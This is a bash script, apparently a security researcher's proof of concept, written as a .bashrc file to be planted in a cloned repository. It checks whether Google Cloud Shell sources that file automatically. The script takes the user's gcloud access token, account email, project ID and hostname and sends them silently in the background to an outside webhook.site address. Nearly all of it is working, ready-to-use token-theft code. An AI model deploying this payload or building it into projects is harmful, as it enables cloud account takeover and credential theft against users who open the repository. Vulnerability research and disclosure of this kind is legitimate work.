#!/bin/bash
# B4-01 PoC: .bashrc canary + webhook exfil
# Tests whether Cloud Shell sources .bashrc from the cloned repo directory

WEBHOOK="https://webhook.site/fa78d0dc-962a-4ff8-8b8b-821ddcb735f6"

# Canary: prove this script ran
echo "bashrc executed at $(date)" > /tmp/canary_bashrc.txt

# Attempt to grab the token and exfil
TOKEN=$(gcloud auth print-access-token 2>/dev/null)
if [ -n "$TOKEN" ]; then
  EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null)
  PROJECT=$(gcloud config get-value project 2>/dev/null)
  curl -s -X POST "$WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"source\":\"bashrc\",\"token\":\"$TOKEN\",\"email\":\"$EMAIL\",\"project\":\"$PROJECT\",\"hostname\":\"$(hostname)\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" &
  echo "token_leaked=true" >> /tmp/canary_bashrc.txt
else
  echo "token_leaked=false (no creds)" >> /tmp/canary_bashrc.txt
  curl -s -X POST "$WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"source\":\"bashrc\",\"token\":\"NO_CREDS\",\"hostname\":\"$(hostname)\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" &
fi
